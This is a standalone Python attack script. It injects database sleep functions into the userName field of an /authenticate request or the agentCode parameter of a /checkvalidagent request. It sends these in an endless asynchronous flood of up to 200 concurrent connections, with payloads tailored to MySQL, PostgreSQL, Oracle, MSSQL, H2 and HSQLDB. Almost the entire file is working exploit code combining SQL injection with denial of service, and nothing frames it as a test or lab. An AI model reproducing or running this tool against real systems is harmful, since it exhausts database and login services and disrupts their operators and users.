#!/usr/bin/env python3
import asyncio, argparse, json, signal, ssl
from urllib.parse import urlparse, quote

PAYLOAD_BASE = {
    "header": {},
    "payload": {
        "userName": None,  # set at runtime
        "password": "y",
    },
}

def build_injection(db: str, sleep_seconds: int) -> str:
    db = db.lower()
    if db in {"mysql", "mariadb", "h2", "hsqldb"}:
        expr = f"function('sleep',{sleep_seconds})=0"
    elif db == "postgres":
        # pg_sleep returns void; treat call result as null -> predicate using IS NULL
        expr = f"function('pg_sleep',{sleep_seconds}) is null"
    elif db == "oracle":
        # dbms_lock.sleep(N) returns 0 on success
        expr = f"function('dbms_lock.sleep',{sleep_seconds})=0"
    elif db == "mssql":
        expr = f"function('DATALENGTH', function('REPLICATE', function('CONCAT', function('NEWID'), function('REPLICATE','A',4000), function('REPLICATE','B',4000), function('REPLICATE','C',4000), function('REPLICATE','D',4000)), 50000))>0"
    else:
        # Fallback: no portable sleep; use tautology so request still parses
        expr = "1=1"
    return f"0' or ({expr}) or '1'='2"

stop_requested = False
sent = 0
errors = 0


def handle_sig(*_):
    global stop_requested
    stop_requested = True


async def send_one(parsed, body_bytes, connect_timeout, write_timeout, linger, *, target, prebuilt_agent_path=None):
    global sent, errors
    scheme = parsed.scheme
    host = parsed.hostname or "127.0.0.1"
    port = parsed.port or (443 if scheme == "https" else 80)
    ssl_ctx = None
    if scheme == "https":
        ssl_ctx = ssl.create_default_context()
    try:
        fut = asyncio.open_connection(host, port, ssl=ssl_ctx)
        reader, writer = await asyncio.wait_for(fut, timeout=connect_timeout)
        if target == "authenticate":
            headers = [
                f"POST {parsed.path or '/authenticate'} HTTP/1.1",
                f"Host: {host}",
                "User-Agent: auth-flood/1",
                "Accept: application/json",
                "Content-Type: application/json",
                f"Content-Length: {len(body_bytes)}",
                "Connection: close",
                "", "",
            ]
            req = "\r\n".join(headers).encode() + body_bytes
        else:  # agent
            path = prebuilt_agent_path or (parsed.path or '/checkvalidagent')
            headers = [
                f"GET {path} HTTP/1.1",
                f"Host: {host}",
                "User-Agent: auth-flood/1",
                "Accept: */*",
                "Connection: close",
                "", "",
            ]
            req = "\r\n".join(headers).encode()
        await asyncio.wait_for(writer.drain(), timeout=write_timeout)  # ensure buffer space
        writer.write(req)
        try:
            await asyncio.wait_for(writer.drain(), timeout=write_timeout)
        except Exception:
            pass
        if linger:
            await asyncio.sleep(linger)
        writer.close()
        # Do not await writer.wait_closed(); we want fire-and-forget
        sent += 1
    except Exception:
        errors += 1


async def run(args):
    global stop_requested
    parsed = urlparse(args.url)
    if not parsed.scheme:
        parsed = urlparse("http://" + args.url)
    path = parsed.path or "/authenticate"
    if path == "/":
        # default path
        parsed = parsed._replace(path="/authenticate")

    body_bytes = b""
    prebuilt_agent_path = None
    inj_full = build_injection(args.db, args.sleep)
    if args.target == "authenticate":
        body_obj = json.loads(json.dumps(PAYLOAD_BASE))  # deep copy via serialize
        body_obj["payload"]["userName"] = inj_full
        body_bytes = json.dumps(body_obj, separators=(",", ":")).encode()
    else:
        inj_enc = quote(inj_full, safe="")
        path = parsed.path or "/checkvalidagent"
        if path == "/":
            path = "/checkvalidagent"
        prebuilt_agent_path = f"{path}?agentCode={inj_enc}"

    semaphore = asyncio.Semaphore(args.concurrency)

    async def producer():
        while not stop_requested:
            await semaphore.acquire()
            asyncio.create_task(worker())
            if args.interval > 0:
                await asyncio.sleep(args.interval)

    async def worker():
        try:
            await send_one(parsed, body_bytes, args.connect_timeout, args.write_timeout, args.linger, target=args.target, prebuilt_agent_path=prebuilt_agent_path)
        finally:
            semaphore.release()

    asyncio.create_task(producer())

    # Progress printer
    last = 0
    try:
        while True:
            await asyncio.sleep(1)
            if args.progress and sent != last:
                print(f"sent={sent} errors={errors}")
                last = sent
            if stop_requested:
                break
    finally:
        # brief grace period for currently writing tasks
        await asyncio.sleep(0.5)
        if args.progress:
            print(f"final: sent={sent} errors={errors}")


def parse_args():
    ap = argparse.ArgumentParser(description="Infinite asynchronous fire-and-forget flood of /authenticate with sleep injection (Ctrl+C to stop)")
    ap.add_argument("--url", default=None, help="Base URL (defaults per target) e.g. http://127.0.0.1:8443")
    ap.add_argument("--target", choices=["authenticate", "agent"], default="authenticate", help="Endpoint target: authenticate (POST) or agent (GET /checkvalidagent)")
    ap.add_argument("--concurrency", type=int, default=200, help="Max simultaneous open connections")
    ap.add_argument("--interval", type=float, default=0.0, help="Delay between scheduling requests (seconds)")
    ap.add_argument("--sleep", type=int, default=10, help="DB sleep seconds inside injected payload (if supported by chosen DB)")
    ap.add_argument("--db", choices=["mysql","mariadb","postgres","mssql","oracle","h2","hsqldb"], default="mysql", help="Target DB type to tailor sleep function (default: mysql)")
    ap.add_argument("--connect-timeout", type=float, default=3.0, help="TCP connect timeout")
    ap.add_argument("--write-timeout", type=float, default=3.0, help="Write/drain timeout")
    ap.add_argument("--linger", type=float, default=0.0, help="Optional delay after sending before closing")
    ap.add_argument("--progress", action="store_true", help="Print per-second progress")
    args = ap.parse_args()
    if not args.url:
        # derive default URL per target
        base = "http://127.0.0.1:8443"
        if args.target == "authenticate":
            args.url = base + "/authenticate"
        else:
            args.url = base + "/checkvalidagent"
    return args


def main():
    args = parse_args()
    signal.signal(signal.SIGINT, handle_sig)
    if hasattr(signal, "SIGTERM"):
        signal.signal(signal.SIGTERM, handle_sig)
    try:
        asyncio.run(run(args))
    except KeyboardInterrupt:
        pass
    print(f"Done. sent={sent} errors={errors}")


if __name__ == "__main__":
    main()
